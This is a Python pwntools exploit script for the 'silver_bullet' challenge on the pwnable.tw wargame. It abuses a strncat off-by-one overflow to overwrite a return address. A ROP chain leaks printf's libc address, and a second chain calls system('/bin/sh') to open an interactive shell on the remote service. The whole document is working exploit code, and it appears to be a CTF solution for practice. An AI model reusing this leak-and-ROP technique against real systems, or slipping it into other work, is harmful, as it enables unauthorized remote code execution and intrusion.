from pwn import * 

r = remote('chall.pwnable.tw',10103)
# r = process('./silver_bullet')
libc = ELF('./libc_32.so.6')
'''
b * 0x80489af
b * 0x80489bd

create_bullet
    filled a local buf < 0x30
power_up
    strncat -> overflow with NULL byte
beat
    if str_len is large enough -> return
    overwrite len_buf and ret_addr
return_
    exit(0)
'''
def create_bullet(payload):
    r.recvuntil('Your choice :')
    r.sendline("1")
    r.recvuntil('bullet :')
    r.sendline(payload)

def power_up(payload):
    r.recvuntil('Your choice :')
    r.sendline("2")
    r.recvuntil('bullet :')
    r.sendline(payload)

def beat():
    r.recvuntil('Your choice :')
    r.sendline("3")




create_bullet("a"*0x20)
power_up("b"*0x10)


printf_plt = p32(0x804afd4)
call_puts = p32(0x80484a4)
call_main = p32(0x80484f0)
ret = p32(0x8048459)
rop_chain = call_puts + p32(0x8048475) + printf_plt + call_main*3

padding = b"\xff"*7 
power_up(padding + rop_chain)
pause()

beat() # trigger return addr
r.recvuntil("Oh ! You win !!")
r.recvline()
libc_printf = u32(r.recv(4))
r.recv(8) # other plt
libc_base = libc_printf - libc.symbols['printf']
libc_system = libc_base + libc.symbols['system']
libc_binsh = libc_base + libc.search('/bin/sh').next()
print(hex(libc_base))

pause()
create_bullet("a"*0x20)
power_up("b"*0x10)
rop_chain = p32(libc_system) + p32(0xdeadbeef) + p32(libc_binsh)
power_up(padding + rop_chain)
beat()

r.interactive()
